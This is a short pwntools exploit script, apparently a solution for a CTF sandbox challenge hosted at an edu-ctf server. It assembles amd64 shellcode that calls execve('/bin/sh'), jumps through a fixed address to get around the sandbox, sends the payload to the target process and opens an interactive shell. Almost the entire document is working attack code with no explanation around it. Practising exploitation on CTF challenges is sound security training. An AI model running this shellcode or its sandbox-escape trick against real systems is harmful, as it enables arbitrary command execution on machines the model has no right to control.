from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = remote('edu-ctf.zoolab.org', 30202)
r = process('./sandbox')

# execve("/bin/sh", 0, 0)
sc = asm("""
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx

mov rdi, 0x68732f6e69622f
mov qword ptr [rbp], rdi
mov rdi, rbp
push 0x4003f
ret
""")

gdb.attach(r)

r.send(sc)
r.interactive()